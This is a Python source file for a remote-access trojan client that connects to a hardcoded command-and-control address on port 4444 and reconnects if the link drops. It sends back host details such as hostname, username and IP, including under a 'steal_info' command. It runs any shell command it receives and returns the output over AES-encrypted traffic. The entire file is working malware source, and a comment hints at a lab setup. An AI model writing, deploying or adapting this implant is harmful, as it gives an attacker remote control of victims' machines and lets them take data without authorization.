import socket
import sys
import os
import json
import subprocess
import time
import base64
import platform
import psutil
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# ====================== CONFIG ======================
C2_IP   = "192.168.91.128"      # ← Your C2 host-only IP (from the screenshot)
C2_PORT = 4444

AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
AES_IV  = b'ThisIsA16ByteIV!'
# ====================================================

def encrypt(data, key=AES_KEY, iv=AES_IV):
    if isinstance(data, str):
        data = data.encode()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))

def decrypt(encrypted_data, key=AES_KEY, iv=AES_IV):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size)

def get_system_info():
    info = {
        "platform": platform.system(),
        "release": platform.release(),
        "hostname": platform.node(),
        "username": os.getenv("USER") or "unknown",
        "local_ip": "unknown",
        "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2)
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        pass
    return info

def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
        return (result.stdout + result.stderr).strip() or "Command executed (no output)"
    except Exception as e:
        return f"Error: {str(e)}"

# Global connection
connection = None

def server(ip, port):
    global connection
    while True:
        try:
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((ip, port))
            print(f"[+] Connected to C2 {ip}:{port}")
            return
        except Exception as e:
            print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

def send(data):
    try:
        if isinstance(data, (dict, list)):
            data = json.dumps(data)
        encrypted = encrypt(data)
        connection.send(encrypted)
    except Exception as e:
        print(f"[-] Send error: {e}")
        server(C2_IP, C2_PORT)

def receive():
    data = b""
    while True:
        try:
            chunk = connection.recv(4096)
            if not chunk:
                raise ConnectionError("Disconnected")
            data += chunk
            try:
                # Try to decrypt + parse as soon as we have enough data
                decrypted = decrypt(data).decode()
                return json.loads(decrypted) if decrypted.startswith("{") or decrypted.startswith("[") else decrypted
            except:
                continue   # need more data
        except Exception as e:
            print(f"[-] Receive error: {e}")
            server(C2_IP, C2_PORT)
            return None

def run():
    # Send initial info
    send(get_system_info())

    while True:
        try:
            command = receive()
            if not command:
                continue

            print(f"[*] Command received: {command}")

            if command in ["exit", "quit"]:
                send("Client exiting...")
                break

            elif command in ["steal_info", "info", "sysinfo"]:
                send(get_system_info())

            elif command.startswith("cd "):
                try:
                    os.chdir(command[3:].strip())
                    send(f"Changed to: {os.getcwd()}")
                except Exception as e:
                    send(str(e))

            elif command == "pwd":
                send(os.getcwd())

            else:
                # Execute any shell command
                result = run_command(command)
                send(result)

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Error: {e}")
            time.sleep(2)
            server(C2_IP, C2_PORT)

if __name__ == "__main__":
    print("[*] Linux-compatible client starting...")
    print(f"[*] Target C2: {C2_IP}:{C2_PORT}")
    server(C2_IP, C2_PORT)
    run()
